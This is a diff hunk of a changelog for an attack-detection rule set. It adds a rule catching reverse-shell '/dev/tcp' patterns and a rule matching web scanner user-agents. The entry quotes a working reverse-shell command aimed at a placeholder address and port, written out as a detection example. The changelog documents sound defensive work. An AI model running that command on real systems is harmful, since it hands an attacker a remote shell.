@@ -61,6 +61,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/).
   page and missing on it. They are the page's own now.
 
 ### Added
+- **`ATK-SHELL@2`** (attack rules `2026.10.2`, `include @attacks`): also a
+  reverse shell's `/dev/tcp/<host>/<port>` (or `/dev/udp/…`) --
+  `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1` passed revision 1, which needs
+  a `;` or `|` before a command; `/dev/tcp` named alone passes.
 - **`ATK-UA-TOOLS@2`** (attack rules `2026.10.2`, `include @attacks`): also
   feroxbuster, arachni, whatweb and w3af by their default User-Agent, and
   ffuf by the one it really sends ("Fuzz Faster U Fool v2…") -- revision 1
